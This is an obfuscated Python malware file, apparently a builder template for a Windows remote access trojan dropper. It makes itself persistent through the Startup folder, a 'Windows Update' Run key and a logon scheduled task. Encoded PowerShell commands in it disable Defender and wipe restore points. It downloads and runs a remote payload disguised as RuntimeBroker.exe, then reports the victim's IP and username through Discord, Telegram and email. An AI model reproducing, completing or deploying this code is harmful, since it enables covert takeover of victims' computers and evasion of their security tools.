import time as greduhio
import subprocess as xvcj5tr
import smtplib as ewfg45z54
from email.mime.multipart import MIMEMultipart as f4r354
from email.mime.text import MIMEText as er34x
import requests as wef4323
import json as rdefg45t54
from telegram import Bot as ef9igj48
import os as ewsjinf783
import platform as btrrf98
import shutil as euifew
import sys as wzf8u4w7
import winreg as ef9uh77 
import threading as wefuh4323
import random as e987xcy4
import asyncio as nueia8732q

xwwwrew = '%Brgxer%'
dsfrsdjk = '%Zrxgre%'
dsvisdf = '%Brxger%'

yxuiue = '%Bxud%'
deiuc = '%Hdhji%'

deswsjn = '%webhook%'
nrejfe3 = "%paste%"

kuhio49 = '%tele%'
kuhioxx49 = '%chatid%'

regh54 = '%smtp%'

dvxkioucb = '%pas%'

fwefg54z54 = '%rec%'

r6zuj75654 = 'New Slave'


def esuih():
    try:
        euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(ewsjinf783.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'))
    except Exception as e:
        pass



def fwf9ud98():
    try:
        htruhijn = ef9uh77.HKEY_CURRENT_USER
        dfvf = r'Software\Microsoft\Windows\CurrentVersion\Run'
        ewf43 = ef9uh77.OpenKey(htruhijn, dfvf, 0, ef9uh77.KEY_SET_VALUE)

        ewsjinf783.path.basename(ewsjinf783.path.abspath(wzf8u4w7.argv[0]))
        ef9uh77.SetValueEx(ewf43, 'Windows Update', 0, ef9uh77.REG_SZ, ewsjinf783.path.abspath(wzf8u4w7.argv[0]))
        ef9uh77.CloseKey(ewf43)
    except Exception as e:
        pass

def hzirge():
    try:
        bdfg = e987xcy4.randint(1000,9999)
        awdt553234 = "C:\\Windows\\Fonts"
        xcsgf4 = f"MicrosoftStore_temp{str(bdfg)}"
        x5g4g654z654 = ewsjinf783.path.join(awdt553234, xcsgf4)
        ewsjinf783.makedirs(x5g4g654z654, exist_ok=True)
        euifew.copy(ewsjinf783.path.abspath(wzf8u4w7.argv[0]), ewsjinf783.path.join(x5g4g654z654))
        xvcj5tr.run(f'schtasks /create /tn "Windows Update" /sc ONLOGON /rl HIGHEST /tr "{ewsjinf783.path.abspath(wzf8u4w7.argv[0])}"', shell=True, capture_output=False)
        
    except Exception as e:
        pass


world = 'powershell.exe -EncodedCommand UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAnAC4AZQB4AGUAJwA7ACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4ARQB4AHQAZQBuAHMAaQBvAG4AIAAnAC4AcAB5ACcAOwAgACAAQQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUABhAHQAaAAgACcAQwA6AFwAJwA7ACAAIABBAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAALQBFAHgAYwBsAHUAcwBpAG8AbgBQAGEAdABoACAAJwBEADoAXAAnAA=='

moon = 'powershell.exe -EncodedCommand RwBlAHQALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAdABvAHIAZQBQAG8AaQBuAHQAIAB8ACAARABlAGwAZQB0AGUALQBDAG8AbQBwAHUAdABlAHIAUgBlAHMAdABvAHIAZQBQAG8AaQBuAHQA'


def awfes54():
    try:
        awdwa32 = wef4323.get('https://api.ipify.org?format=json')
        xycxy = awdwa32.json()
        return xycxy['ip']
    except Exception as e:
        return None

efewrf = awfes54()
awdewa98ßu43 = btrrf98.system()
awdewa98ßu43we = btrrf98.release()

def gesnui():
    ghtfh546t = f'🐀 [RAT]\n\nIP: {efewrf}\nUser: {ewsjinf783.getlogin()}'
    gsret5e78z = f4r354()
    gsret5e78z['From'] = regh54
    gsret5e78z['To'] = fwefg54z54
    gsret5e78z['r6zuj75654'] = r6zuj75654

    gsret5e78z.attach(er34x(ghtfh546t, 'plain'))

    try:
        wefggggrde87 = ewfg45z54.SMTP('smtp.gmail.com', 587)
        wefggggrde87.starttls()

        wefggggrde87.login(regh54, dvxkioucb)

        vfdkio9 = gsret5e78z.as_string()
        wefggggrde87.sendmail(regh54, fwefg54z54, vfdkio9)
    except Exception as e:
        pass
    finally:
        wefggggrde87.quit()

def redugh8():
    try:
        xcwe23 = {
            'embeds': [
                {
                    'title': f'RAT | {r6zuj75654}',
                    'description': f'__**🐀 [RAT]**__\n\n- IP: **{efewrf}**\n- User: **{ewsjinf783.getlogin()}**',
                    'color': int('000ff7', 16),
                    'footer': {'text': 'Coded by Swezy <3'}
                }
            ]
        }
        daw2 = {'Content-Type': 'application/json'}
        dawd3212432efergg = wef4323.post(deswsjn, headers=daw2, data=rdefg45t54.dumps(xcwe23))

        if dawd3212432efergg.status_code == 200:
            pass
        else:
            pass
    except Exception as e:
        pass


async def egreger453645():
    try:
        zh5 = ef9igj48(token=kuhio49)
        eguo6643 = f'🐀 [RAT]\n\nIP: {efewrf}\nUser: {ewsjinf783.getlogin()}'
        await zh5.send_message(chat_id=kuhioxx49, text=eguo6643)
    except Exception as e:
        pass


def vdsu281cjm():
    dfru31Xg = wef4323.get(nrejfe3)
    if dfru31Xg.status_code == 200 or 201:
        wji0ri9 = dfru31Xg.text.strip()
        rekdnx = wef4323.get(wji0ri9)
        if rekdnx.status_code == 201 or 201:
            h2hcvc3r23sacxy = "C:\\Windows\\Fonts\\RuntimeBroker.exe"
            with open(h2hcvc3r23sacxy, "wb") as ouiref:
                ouiref.write(rekdnx.content)
                greduhio.sleep(3)
                if deswsjn != 'None':
                    wefuh4323.Thread(target=redugh8).start()

                if kuhio49 != 'None':
                    wefuh4323.Thread(target=nueia8732q.run(egreger453645())).start()

                if regh54 != 'None':
                    wefuh4323.Thread(target=gesnui).start()
                ewsjinf783.system(f"start {h2hcvc3r23sacxy}")
        else:
            ewsjinf783._exit(0)
    else:
        ewsjinf783._exit(0)


if __name__ == '__main__':
    if deiuc == 'y':
        try:
            print("1 Shell Command")
            xvcj5tr.run(moon, shell=True, capture_output=False)
        except Exception as e:
            pass

    if yxuiue == 'y':
        try:
            print("2 Shell Command")
            xvcj5tr.run(world, shell=True, capture_output=False)
        except Exception as e:
            pass

    if xwwwrew == 'y':
        print("1 StartUp")
        esuih()
    else:
        pass
    if dsfrsdjk == 'y':
        print("2 StartUp")
        hzirge()
    else:
        pass
    if dsvisdf == 'y':
        print("3 StartUp")
        hzirge()
    else:
        pass
    
    print("1 Real Program")
    vdsu281cjm()
